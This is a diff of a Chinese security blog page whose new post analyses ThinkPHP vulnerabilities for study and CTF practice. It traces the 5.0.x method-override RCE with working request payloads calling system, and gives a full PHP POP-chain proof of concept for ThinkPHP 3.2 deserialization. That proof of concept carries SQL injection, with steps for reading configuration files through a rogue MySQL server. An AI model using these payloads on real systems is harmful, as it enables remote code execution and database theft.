@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">Node.js | Troy3e</title>
+  <title itemprop="name">ThinkPHP X 源码分析 | Troy3e</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -185,15 +185,15 @@
 
   <div class="pattern-center single-center">
     <!-- 有配图默认渲染第一张 -->
-    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1140864.jpg);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1140864.jpg">
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-719179.png);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-719179.png">
     </div>
     <header class="pattern-header single-header">
       <h1 class="entry-title">
-      Node.js</h1>
+      ThinkPHP X 源码分析</h1>
       <p class="entry-census">
         <span>
           <a href="">
-            <img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210308190505.jpg">
+            <img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210427144151.jpg">
           </a>
         </span>
         <span>
@@ -201,7 +201,7 @@
         </span>
         <span class="bull">
         ·</span>
-        2021-4-6<span class="bull">
+        2021-4-26<span class="bull">
         ·</span>
       <span id="busuanzi_value_page_pv"></span>次阅读</p>
     </header>
@@ -215,10 +215,211 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          <h2 id="从官方文档开始学习：https-nodejs-dev-learn"><a href="#从官方文档开始学习：https-nodejs-dev-learn" class="headerlink" title="从官方文档开始学习：https://nodejs.dev/learn"></a>从官方文档开始学习：<a href="https://nodejs.dev/learn" target="_blank" rel="noopener">https://nodejs.dev/learn</a></h2><h2 id="Node-js常见漏洞学习：https-xz-aliyun-com-t-7184"><a href="#Node-js常见漏洞学习：https-xz-aliyun-com-t-7184" class="headerlink" title="Node.js常见漏洞学习：https://xz.aliyun.com/t/7184"></a>Node.js常见漏洞学习：<a href="https://xz.aliyun.com/t/7184" target="_blank" rel="noopener">https://xz.aliyun.com/t/7184</a></h2><p>1、CTFSHOW 看WP云做题学习一些姿势。<br><a href="https://blog.csdn.net/miuzzx/article/details/111780832" target="_blank" rel="noopener">https://blog.csdn.net/miuzzx/article/details/111780832</a><br><a href="https://blog.csdn.net/rfrder/article/details/115218397" target="_blank" rel="noopener">https://blog.csdn.net/rfrder/article/details/115218397</a><br><a href="https://blog.csdn.net/solitudi/article/details/111669500" target="_blank" rel="noopener">https://blog.csdn.net/solitudi/article/details/111669500</a></p>
-<p>2、Javascript原型链官方文档：<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain</a></p>
-<p>p神：<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a><br>其中看到p神一句话写的很好：“我一直觉得，出题不要刻意创造漏洞，而是找找你的知识点是否能在真实环境下找到应用。”</p>
-<p>暂时先看到这里</p>
+          <p>复现一下ThinkPHP的各种漏洞，锻炼一下自己分析源码的能力，持续更新。<br>更新记录：<br>4/26<br>4/6<br>4/2<br>2021/3/28</p>
+<h2 id="ThinkPHP-5-0-x-lt-5-0-23-RCE分析-2021-3-28"><a href="#ThinkPHP-5-0-x-lt-5-0-23-RCE分析-2021-3-28" class="headerlink" title="ThinkPHP 5.0.x (&lt;=5.0.23) RCE分析 2021/3/28"></a>ThinkPHP 5.0.x (&lt;=5.0.23) RCE分析 2021/3/28</h2><p>首先查看官方log：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210328215733.png" alt></p>
+<p>改进request的method方法，所以我们diffinity直接对比两个版本区别：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210328220634.png" alt></p>
+<p>在5.0.24中对method作了白名单的限制，只允许$this-&gt;method为常用的几个方法，否则就将其置为POST方法，因此我们的入口点就可以从Request.php跟进。<br>(如果按正常思路寻找的话，index.php-&gt;start.php-&gt;routeCheck-&gt;check 也是可以跟到method的)<br>全局搜索call_user_func，在Request.php中发现在filterValue方法中。</p>
+<pre><code>private function filterValue(&amp;$value, $key, $filters)
+    {
+        $default = array_pop($filters);//弹出并返回 array 数组的最后一个单元，并将数组 array 的长度减一。
+        foreach ($filters as $filter) {
+            if (is_callable($filter)) {//是否能调用
+                $value = call_user_func($filter, $value);
+            } elseif (is_scalar($value)) {//检测变量是否是一个标量
+                if (false !== strpos($filter, &#39;/&#39;)) {//strpos检测字符第一次出现
+                    // 正则过滤
+                    if (!preg_match($filter, $value)) {
+                        // 匹配不成功返回默认值
+                        $value = $default;
+                        break;
+                    }
+                } elseif (!empty($filter)) {
+                    // filter函数不存在时, 则使用filter_var进行过滤
+                    // filter为非整形值时, 调用filter_id取得过滤id
+                    $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));
+                    if (false === $value) {
+                        $value = $default;
+                        break;
+                    }
+                }
+            }
+        }
+        return $this-&gt;filterExp($value);
+    }
+</code></pre><p>自己尝试理解下，首先default被赋予filters的最后一个值，然后一个个尝试filters里剩下的值是否为能调用的函数，是的话直接调用，不是的话检测value里是否是一个标量，是的话继续判断filter里有无/，有则将default即filters的最后一个值赋给它。否则（这个否则是针对filters里是否有/）判断filter是否为空，不为空则进行源码注释里的判断。<br>看似莫名其妙，所以我们全局搜一下调用filterValue的方法：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210328223941.png" alt></p>
+<p>input里面调用了它。<br>无论$data是不是数组最终都会调用filterValue方法，而$filter则会进行过滤器解析，跟进$this-&gt;getFilter方法查看解析过程:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210328225503.png" alt></p>
+<p>说实话这个我没太理解 暂且继续往下看<br>回到input方法中，array_walk_recursive函数会对第一个数组参数中的每个元素应用第二个参数的函数。在input类方法中，$data中键名作为filterValue(&amp;$value, $key, $filters)中的value,键值作为key,filter作为第三个参数$filters,而当这些传入到filterValue后，call_user_func又是利用filter作为回调的函数，value作为回调函数的参数，因此也就是input方法中的data是回调函数的参数，filter是需要回调的函数。<br>了解之后我们需要查找input方法在何处被调用，全局搜索一下：<br>同文件param方法最后调用该方法并作为返回：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210328234006.png" alt></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210329004503.png" alt></p>
+<pre><code>$this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));
+</code></pre><p>作为data传入input，跟进$this-&gt;get</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210329000306.png" alt></p>
+<p>如果$this-&gt;get为空，直接将其赋值为$_GET,而最后将$this-&gt;get作为input方法的第一个参数，因此我们可以听过变量覆盖，直接将$this-&gt;get赋值，就此我们控制了回调函数和参数。</p>
+<pre><code>即_method=__construct&amp;filter[]=system&amp;get[]=whoami或者_method=__construct&amp;filter[]=system&amp;route[]=whoami。
+</code></pre><p>重新推一下，我们可以控制Request类所有方法及属性。<br>在param方法里，$method = $this-&gt;method(true);<br>跟一下method</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210329002144.png" alt></p>
+<p>再跟进server：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210329002632.png" alt></p>
+<p>$name的值是REQUEST_METHOD。server()方法中又跟进了input()方法，第一个参数$this-&gt;server可以利用之前__construct()方法进行属性覆盖，因此$this-&gt;server可控。<br>跟进input()方法：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210328223941.png" alt></p>
+<p>$name是REQUEST_METHOD，会进入if (‘’ != $name) {。这些代码就相当于$data=$data[‘REQUEST_METHOD’]。而$data就是可控的$this-&gt;server，因此这里$data也可控。再往下看：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210328225503.png" alt></p>
+<p>相当于$filter=$this-&gt;filter，因此过滤器也可控。接下来就进入了filterValue方法，$data是可控的参数，$filter是可控的函数，再进入利用call_user_func即可RCE。最终构造：</p>
+<pre><code>_method=__construct&amp;filter=system&amp;server[REQUEST_METHOD]=dir
+</code></pre><p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210329004703.png" alt></p>
+<p>成功执行，危害极大。</p>
+<p>漏洞原因：method没有进行限制，导致可以任意调用、覆盖类和属性。<br>参考：<a href="https://www.anquanke.com/post/id/222672" target="_blank" rel="noopener">https://www.anquanke.com/post/id/222672</a><br><a href="https://blog.csdn.net/rfrder/article/details/114298944" target="_blank" rel="noopener">https://blog.csdn.net/rfrder/article/details/114298944</a></p>
+<h2 id="5-x-lt-5-1-31-rce-4-2"><a href="#5-x-lt-5-1-31-rce-4-2" class="headerlink" title="5.x &lt; 5.1.31 rce 4/2"></a>5.x &lt; 5.1.31 rce 4/2</h2><p><a href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection" target="_blank" rel="noopener">https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection</a></p>
+<p>先放个链接 </p>
+<h2 id="ThinkPHP5深入学习-4-6"><a href="#ThinkPHP5深入学习-4-6" class="headerlink" title="ThinkPHP5深入学习 4/6"></a>ThinkPHP5深入学习 4/6</h2><p>官方文档：<a href="https://www.kancloud.cn/manual/thinkphp5/118003" target="_blank" rel="noopener">https://www.kancloud.cn/manual/thinkphp5/118003</a></p>
+<pre><code>project  应用部署目录
+├─application           应用目录（可设置）
+│  ├─common             公共模块目录（可更改）
+│  ├─index              模块目录(可更改)
+│  │  ├─config.php      模块配置文件
+│  │  ├─common.php      模块函数文件
+│  │  ├─controller      控制器目录
+│  │  ├─model           模型目录
+│  │  ├─view            视图目录
+│  │  └─ ...            更多类库目录
+│  ├─command.php        命令行工具配置文件
+│  ├─common.php         应用公共（函数）文件
+│  ├─config.php         应用（公共）配置文件
+│  ├─database.php       数据库配置文件
+│  ├─tags.php           应用行为扩展定义文件
+│  └─route.php          路由配置文件
+├─extend                扩展类库目录（可定义）
+├─public                WEB 部署目录（对外访问目录）
+│  ├─static             静态资源存放目录(css,js,image)
+│  ├─index.php          应用入口文件
+│  ├─router.php         快速测试文件
+│  └─.htaccess          用于 apache 的重写
+├─runtime               应用的运行时目录（可写，可设置）
+├─vendor                第三方类库目录（Composer）
+├─thinkphp              框架系统目录
+│  ├─lang               语言包目录
+│  ├─library            框架核心类库目录
+│  │  ├─think           Think 类库包目录
+│  │  └─traits          系统 Traits 目录
+│  ├─tpl                系统模板目录
+│  ├─.htaccess          用于 apache 的重写
+│  ├─.travis.yml        CI 定义文件
+│  ├─base.php           基础定义文件
+│  ├─composer.json      composer 定义文件
+│  ├─console.php        控制台入口文件
+│  ├─convention.php     惯例配置文件
+│  ├─helper.php         助手函数文件（可选）
+│  ├─LICENSE.txt        授权说明文件
+│  ├─phpunit.xml        单元测试配置文件
+│  ├─README.md          README 文件
+│  └─start.php          框架引导文件
+├─build.php             自动生成定义文件（参考）
+├─composer.json         composer 定义文件
+├─LICENSE.txt           授权说明文件
+├─README.md             README 文件
+├─think                 命令行入口文件
+</code></pre><h2 id="ThinkPHP-v3-2-（SQL注入-amp-文件读取）反序列化POP链-4-26"><a href="#ThinkPHP-v3-2-（SQL注入-amp-文件读取）反序列化POP链-4-26" class="headerlink" title="ThinkPHP v3.2.* （SQL注入&amp;文件读取）反序列化POP链 4/26"></a>ThinkPHP v3.2.* （SQL注入&amp;文件读取）反序列化POP链 4/26</h2><p>来自[红明谷CTF 2021]EasyTP的考点，遇到了就来分析一下，不能睁只眼闭只眼看一遍。</p>
+<p>环境搭建：<br>composer create-project topthink/thinkphp=3.2.3 tp3</p>
+<p>POP链分析:<br>1、找起点<br>全局搜__destruct()</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210426200925.png" alt></p>
+<p>这里的$this-&gt;img可控，且调用了$this-&gt;img的destroy()。</p>
+<p>跳板1：<br>首先找一个包含destroy()函数的类</p>
+<p>Memcache.class.php</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210426205120.png" alt></p>
+<p>但是这里destroy需要传值，所以继续往下找。</p>
+<p>跳板2：</p>
+<p>上面$this-&gt;handle可控，并且调用了$this-&gt;handle的delete()方法，且传过去的参数是部分可控的，因此我们可以继续寻找有delete()方法的跳板类。</p>
+<p>全局搜索function delete(</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210426220634.png" alt></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210426220653.png" alt></p>
+<p>这里的$pk其实就是$this-&gt;pk，是完全可控的。</p>
+<p>下面的$options是从跳板1传过来的，在跳板1中可以控制其是否为空。$this-&gt;options[‘where’]是成员属性，是可控的，因此506行的条件我们可以控制，且508行的条件我们也是可以控制的。</p>
+<p>所以我们可以控制程序走到509行。</p>
+<p>在509中又调用了一次自己$this-&gt;delete()，但是这时候的参数$this-&gt;data[$pk]是我们可控的。(重点</p>
+<p>这时delete()我们就可以成功带可控参数访问了。</p>
+<p>这时候熟悉ThinkPHP的师傅们就应该懂了。这是ThinkPHP的数据库模型类中的delete()方法，最终会去调用到数据库驱动类中的delete()中去，也就是558行。且上面的一堆条件判断很显然都是我们可以控制的包括调用$this-&gt;db-&gt;delete($options)时的$options参数我们也可以控制。</p>
+<p>那么这时候我们就可以调用任意自带的数据库类中的delete()方法了。</p>
+<p>终点:<br>/ThinkPHP/Library/Think/Db/Driver.class.php</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210426220911.png" alt></p>
+<p>这边的参数是完全可控的，所以这里的$table是可控的，将$table拼接到$sql传入了$this-&gt;execute()。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210426221142.png" alt></p>
+<p>这里有个初始化数据库连接的地方</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210426221240.png" alt></p>
+<p>可以通过控制成员属性，使程序调用到$this-&gt;connect()。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210426221320.png" alt></p>
+<p>可以看到这里是去使用$this-&gt;config里的配置去创建了数据库连接，接着去执行前面拼接的DELETESQL语句。</p>
+<p>到此，我们就找到了一条可以连接任意数据库的POP链。</p>
+<p>1、通过某处leak出目标的WEB目录(e.g. DEBUG页面)<br>2、开启恶意MySQL恶意服务端设置读取的文件为目标的数据库配置文件<br>3、触发反序列化<br>4、触发链中PDO连接的部分<br>5、获取到目标的数据库配置<br>6、使用目标的数据库配置再次出发反序列化<br>7、触发链中DELETE语句的SQL注入</p>
+<p>POC:</p>
+<pre><code>&lt;?php
+namespace Think\Db\Driver{
+    use PDO;
+    class Mysql{
+        protected $options = array(
+            PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true    // 开启才能读取文件
+        );
+        protected $config = array(
+            &quot;debug&quot;    =&gt; 1,
+            &quot;database&quot; =&gt; &quot;thinkphp3&quot;,
+            &quot;hostname&quot; =&gt; &quot;127.0.0.1&quot;,
+            &quot;hostport&quot; =&gt; &quot;3306&quot;,
+            &quot;charset&quot;  =&gt; &quot;utf8&quot;,
+            &quot;username&quot; =&gt; &quot;root&quot;,
+            &quot;password&quot; =&gt; &quot;&quot;
+        );
+    }
+}
+
+namespace Think\Image\Driver{
+    use Think\Session\Driver\Memcache;
+    class Imagick{
+        private $img;
+
+        public function __construct(){
+            $this-&gt;img = new Memcache();
+        }
+    }
+}
+
+namespace Think\Session\Driver{
+    use Think\Model;
+    class Memcache{
+        protected $handle;
+
+        public function __construct(){
+            $this-&gt;handle = new Model();
+        }
+    }
+}
+
+namespace Think{
+    use Think\Db\Driver\Mysql;
+    class Model{
+        protected $options   = array();
+        protected $pk;
+        protected $data = array();
+        protected $db = null;
+
+        public function __construct(){
+            $this-&gt;db = new Mysql();
+            $this-&gt;options[&#39;where&#39;] = &#39;&#39;;
+            $this-&gt;pk = &#39;id&#39;;
+            $this-&gt;data[$this-&gt;pk] = array(
+                &quot;table&quot; =&gt; &quot;mysql.user where 1=updatexml(1,user(),1)#&quot;,
+                &quot;where&quot; =&gt; &quot;1=1&quot;
+            );
+        }
+    }
+}
+
+namespace {
+    echo base64_encode(serialize(new Think\Image\Driver\Imagick()));
+}
+</code></pre><p>思路：<a href="https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA?fileGuid=YQ6W8dWWxRpgCVkt" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA?fileGuid=YQ6W8dWWxRpgCVkt</a><br>实战：[红明谷CTF 2021]EasyTP</p>
 
         </div>
         <!-- .entry-content -->
@@ -250,15 +451,15 @@
           
             <div class="post-nepre half previous">
           
-            <a href="/2021/04/09/NCTF2019-phar-matches-everything/" rel="prev">
+            <a href="/2021/04/27/红明谷CTF-2021-EasyTP/" rel="prev">
               <div class="background">
-                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1141314.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1141314.png">
+                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1143941.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1143941.jpg">
               </div>
               <span class="label">
               Previous Post</span>
               <div class="info">
                 <h3>
-                [NCTF2019]phar matches everything</h3>
+                [红明谷CTF 2021]EasyTP</h3>
                 <hr>
               </div>
             </a>
@@ -268,15 +469,15 @@
           
             <div class="post-nepre half next">
           
-            <a href="/2021/03/29/PHP原生类的利用总结/" rel="next">
+            <a href="/2021/04/23/Java-Web安全/" rel="next">
               <div class="background">
-                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1130193.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1130193.jpg">
+                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1142868.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1142868.png">
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                PHP原生类的利用总结</h3>
+                Java Web安全</h3>
                 <hr>
               </div>
             </a>
@@ -300,7 +501,7 @@
 
       <section class="author-profile">
         <div class="info" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-          <a href="" class="profile gravatar"><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210308190505.jpg" itemprop="image" alt="Troy3e" height="70" width="70"></a>
+          <a href="" class="profile gravatar"><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210427144151.jpg" itemprop="image" alt="Troy3e" height="70" width="70"></a>
           <div class="meta">
             <span class="title">Author</span>
             <h3 itemprop="name">
